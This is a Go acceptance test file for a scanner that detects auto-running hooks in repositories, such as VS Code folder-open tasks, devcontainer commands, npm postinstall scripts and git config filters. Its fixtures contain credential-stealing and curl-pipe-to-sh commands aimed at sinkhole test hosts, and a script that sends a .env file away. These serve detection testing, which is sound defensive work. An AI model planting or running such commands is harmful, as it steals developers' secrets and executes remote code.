package acceptance_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// corpus returns the path of a committed fixture in testdata/corpus.
func corpus(t *testing.T, name string) string {
	t.Helper()
	root, err := moduleRoot()
	if err != nil {
		t.Fatal(err)
	}
	return filepath.Join(root, "testdata", "corpus", name)
}

// filesRepo builds a repo from a map of slash-separated paths to content.
func filesRepo(files map[string]string) func(t *testing.T) string {
	return func(t *testing.T) string {
		dir := t.TempDir()
		for name, content := range files {
			p := filepath.Join(dir, filepath.FromSlash(name))
			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		return dir
	}
}

// gitConfigRepo builds a repo whose .git/config has the given content. Git
// cannot commit a nested .git, so the fixture is written at test time.
func gitConfigRepo(config string) func(t *testing.T) string {
	return func(t *testing.T) string {
		dir := t.TempDir()
		for name, content := range map[string]string{
			".git/config": config,
			"README.md":   "# sample\n",
		} {
			p := filepath.Join(dir, filepath.FromSlash(name))
			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		return dir
	}
}

func TestAutoexec(t *testing.T) {
	tests := []struct {
		name string
		// setup returns the target to analyze
		setup func(t *testing.T) string
		// expectations
		wantCode   int
		wantAt     map[string]string // rule to "path:line" that must be present
		wantAbsent []string          // rules that must not appear anywhere
		// wantSeverity is the severity every finding of a rule must have
		wantSeverity map[string]string
		// wantIncomplete is set when a file is expected to be skipped, so coverage is not complete
		wantIncomplete bool
	}{
		{
			name:     "fake interview repo: folder-open task sends the secret away, postinstall runs a script",
			setup:    func(t *testing.T) string { return corpus(t, "fake-interview-repo") },
			wantCode: 20,
			wantAt: map[string]string{
				"GAL-AUTOEXEC-001": ".vscode/tasks.json:7",
				"GAL-AUTOEXEC-010": ".vscode/tasks.json:7",
				"GAL-AUTOEXEC-005": "package.json:6",
			},
		},
		{
			name:     "JSONC task with comments and a trailing comma runs curl on folder open",
			setup:    func(t *testing.T) string { return corpus(t, "p1-folderopen-curl") },
			wantCode: 20,
			wantAt: map[string]string{
				"GAL-AUTOEXEC-001": ".vscode/tasks.json:7",
				"GAL-AUTOEXEC-010": ".vscode/tasks.json:7",
			},
		},
		{
			name:     "devcontainer initializeCommand pipes a download into sh on the host",
			setup:    func(t *testing.T) string { return corpus(t, "p1-devcontainer-init") },
			wantCode: 20,
			wantAt: map[string]string{
				"GAL-AUTOEXEC-003": ".devcontainer/devcontainer.json:5",
				"GAL-AUTOEXEC-011": ".devcontainer/devcontainer.json:5",
			},
		},
		{
			name:     "husky pre-commit hook pipes a download into sh",
			setup:    func(t *testing.T) string { return corpus(t, "p2-husky-curl-sh") },
			wantCode: 20,
			wantAt:   map[string]string{"GAL-AUTOEXEC-011": ".husky/pre-commit:2"},
		},
		{
			name: "broken tasks file hides folderOpen behind an escape and a comment",
			setup: filesRepo(map[string]string{
				".vscode/tasks.json": "{\"tasks\":[{\n\"command\":\"curl -d @$HOME/.aws/credentials https://collect.sinkhole.test/x\"\n\"runOptions\":{\"runOn\" /*x*/ : \"\\u0066olderOpen\"}}]}",
			}),
			wantCode:       20,
			wantAt:         map[string]string{"GAL-AUTOEXEC-001": ".vscode/tasks.json:3", "GAL-AUTOEXEC-010": ".vscode/tasks.json:2"},
			wantIncomplete: true,
		},
		{
			name: "settings point the interpreter into a virtualenv and a script is committed there",
			setup: filesRepo(map[string]string{
				".vscode/settings.json": "{\"python.defaultInterpreterPath\": \"${workspaceFolder}/.venv/bin/python\"}\n",
				".venv/bin/pip":         "#!/bin/sh\ncurl -fsSL https://get.sinkhole.test/x.sh | sh\n",
			}),
			wantCode:   20,
			wantAt:     map[string]string{"GAL-AUTOEXEC-011": ".venv/bin/pip:2"},
			wantAbsent: []string{"GAL-AUTOEXEC-002"},
		},
		{
			name: "benign twin: settings point the interpreter into a virtualenv",
			setup: filesRepo(map[string]string{
				".vscode/settings.json": "{\"python.defaultInterpreterPath\": \"${workspaceFolder}/.venv/bin/python\"}\n",
			}),
			wantCode:   0,
			wantAbsent: []string{"GAL-AUTOEXEC-002"},
		},
		{
			name: "git config fsmonitor runs a command",
			setup: gitConfigRepo("[core]\n\trepositoryformatversion = 0\n" +
				"\tfsmonitor = ./.git/hooks/fsmonitor-evil\n"),
			wantCode: 10,
			wantAt:   map[string]string{"GAL-AUTOEXEC-009": ".git/config:3"},
		},
		{
			name:     "git lfs filter chained with a download is not exempt",
			setup:    gitConfigRepo("[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f && curl -fsSL https://get.sinkhole.test/x.sh | sh\n"),
			wantCode: 20,
			wantAt: map[string]string{
				"GAL-AUTOEXEC-009": ".git/config:2",
				"GAL-AUTOEXEC-011": ".git/config:2",
			},
		},
		{
			name:       "benign twin: plain git lfs filter",
			setup:      gitConfigRepo("[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n"),
			wantCode:   0,
			wantAbsent: []string{"GAL-AUTOEXEC-009", "GAL-AUTOEXEC-011"},
		},
		{
			name:       "benign twin: git config with the built-in fsmonitor daemon",
			setup:      gitConfigRepo("[core]\n\trepositoryformatversion = 0\n\tfsmonitor = true\n"),
			wantCode:   0,
			wantAbsent: []string{"GAL-AUTOEXEC-009"},
		},
		{
			name:       "benign twin: express app with tasks without runOn, CI and registry lockfile",
			setup:      func(t *testing.T) string { return corpus(t, "benign-express-app") },
			wantCode:   0,
			wantAt:     map[string]string{"GAL-AUTOEXEC-008": ".github/workflows/ci.yml:1"},
			wantAbsent: []string{"GAL-AUTOEXEC-001", "GAL-AUTOEXEC-010", "GAL-AUTOEXEC-011", "GAL-AUTOEXEC-012"},
		},
		{
			name:       "benign twin: husky hook that runs lint-staged",
			setup:      func(t *testing.T) string { return corpus(t, "benign-husky-lint") },
			wantCode:   0,
			wantAt:     map[string]string{"GAL-AUTOEXEC-006": ".husky/pre-commit:1"},
			wantAbsent: []string{"GAL-AUTOEXEC-010", "GAL-AUTOEXEC-011", "GAL-AUTOEXEC-012"},
		},
		{
			name:       "benign twin: Makefile with a curl-pipe-sh tool installer is not graded",
			setup:      func(t *testing.T) string { return corpus(t, "benign-go-cli") },
			wantCode:   0,
			wantAt:     map[string]string{"GAL-AUTOEXEC-008": "Makefile:1"},
			wantAbsent: []string{"GAL-AUTOEXEC-011"},
		},
		{
			name: "devcontainer postCreateCommand behind a byte order mark is analyzed",
			setup: filesRepo(map[string]string{
				".devcontainer/devcontainer.json": "\xef\xbb\xbf{\n  \"postCreateCommand\": \"curl -fsSL https://get.sinkhole.test/x.sh | sh\"\n}\n",
			}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-AUTOEXEC-011": ".devcontainer/devcontainer.json:2"},
		},
		{
			name: "package.json behind a byte order mark: the postinstall download is found and the file is analyzed",
			setup: filesRepo(map[string]string{
				"package.json": "\xef\xbb\xbf{\n  \"name\": \"demo\",\n  \"scripts\": {\n    \"postinstall\": \"curl -fsSL https://get.sinkhole.test/x.sh | sh\"\n  }\n}\n",
			}),
			wantCode: 20,
			wantAt: map[string]string{
				"GAL-AUTOEXEC-005": "package.json:4",
				"GAL-AUTOEXEC-011": "package.json:4",
			},
		},
		{
			name: "benign twin: devcontainer installs with npm ci and the package has no lifecycle scripts",
			setup: filesRepo(map[string]string{
				".devcontainer/devcontainer.json": "{\n  \"image\": \"mcr.microsoft.com/devcontainers/javascript-node:24\",\n  \"postCreateCommand\": \"npm ci --ignore-scripts\"\n}\n",
				"package.json":                    "{\n  \"name\": \"demo\",\n  \"scripts\": { \"start\": \"node index.js\" }\n}\n",
			}),
			wantCode:     0,
			wantAt:       map[string]string{"GAL-AUTOEXEC-004": ".devcontainer/devcontainer.json:3"},
			wantSeverity: map[string]string{"GAL-AUTOEXEC-004": "low"},
		},
		{
			name: "benign twin: postinstall runs husky, which the package declares",
			setup: filesRepo(map[string]string{
				"package.json": "{\n  \"name\": \"demo\",\n  \"scripts\": {\n    \"postinstall\": \"husky\"\n  },\n  \"devDependencies\": { \"husky\": \"^9.0.0\" }\n}\n",
			}),
			wantCode:     0,
			wantAt:       map[string]string{"GAL-AUTOEXEC-005": "package.json:4"},
			wantSeverity: map[string]string{"GAL-AUTOEXEC-005": "low"},
		},
		{
			name: "postinstall runs a husky that the repository commits under node_modules/.bin",
			setup: filesRepo(map[string]string{
				"package.json":            "{\n  \"scripts\": {\n    \"postinstall\": \"husky\"\n  },\n  \"devDependencies\": { \"husky\": \"^9.0.0\" }\n}\n",
				"node_modules/.bin/husky": "#!/bin/sh\necho harmless\n",
			}),
			wantCode:     10,
			wantAt:       map[string]string{"GAL-AUTOEXEC-005": "package.json:3"},
			wantSeverity: map[string]string{"GAL-AUTOEXEC-005": "medium"},
		},
		{
			name: "postinstall runs a repository script that sends a secret file away",
			setup: filesRepo(map[string]string{
				"package.json":     "{\n  \"scripts\": {\n    \"postinstall\": \"node scripts/setup.js\"\n  }\n}\n",
				"scripts/setup.js": "const fs = require('fs');\nconst https = require('https');\nconst env = fs.readFileSync('../.env', 'utf8');\nhttps.request({ hostname: 'c.sinkhole.test' }).end(env);\n",
			}),
			wantCode:     20,
			wantAt:       map[string]string{"GAL-AUTOEXEC-005": "package.json:3", "GAL-EXFIL-001": "scripts/setup.js:3"},
			wantSeverity: map[string]string{"GAL-AUTOEXEC-005": "medium"},
		},
		{
			name: "devcontainer npm ci with a PATH set in remoteEnv stays medium",
			setup: filesRepo(map[string]string{
				".devcontainer/devcontainer.json": "{\n  \"remoteEnv\": { \"PATH\": \"/work/bin:${containerEnv:PATH}\" },\n  \"postCreateCommand\": \"npm ci\"\n}\n",
			}),
			wantCode:     10,
			wantAt:       map[string]string{"GAL-AUTOEXEC-004": ".devcontainer/devcontainer.json:3"},
			wantSeverity: map[string]string{"GAL-AUTOEXEC-004": "medium"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given a repo target
			target := tt.setup(t)
			// When the agent analyzes it
			rep := analyze(t, target, tt.wantCode)
			// Then the rules appear at their evidence lines, none of the unwanted rules appear and coverage is complete
			for rule, at := range tt.wantAt {
				if !hasFinding(rep, rule, at) {
					t.Errorf("no %s at %s in %+v", rule, at, rep.Findings)
				}
			}
			for _, f := range rep.Findings {
				if want, ok := tt.wantSeverity[f.RuleID]; ok && f.Severity != want {
					t.Errorf("%s severity = %s, want %s", f.RuleID, f.Severity, want)
				}
				for _, absent := range tt.wantAbsent {
					if f.RuleID == absent {
						t.Errorf("unexpected %s: %+v", absent, f)
					}
				}
				if f.RuleID == "GAL-AUTOEXEC-010" || f.RuleID == "GAL-AUTOEXEC-011" {
					if len(f.Evidence) == 0 || f.Evidence[0].Line == 0 || strings.TrimSpace(f.Evidence[0].Path) == "" {
						t.Errorf("%s has no path:line evidence: %+v", f.RuleID, f)
					}
				}
			}
			if tt.wantIncomplete {
				return
			}
			if rep.Coverage.FilesAnalyzed != rep.Coverage.FilesSeen || len(rep.Coverage.Skipped) != 0 {
				t.Errorf("coverage analyzed/seen/skipped = %d/%d/%v, want all files analyzed", rep.Coverage.FilesAnalyzed, rep.Coverage.FilesSeen, rep.Coverage.Skipped)
			}
		})
	}
}
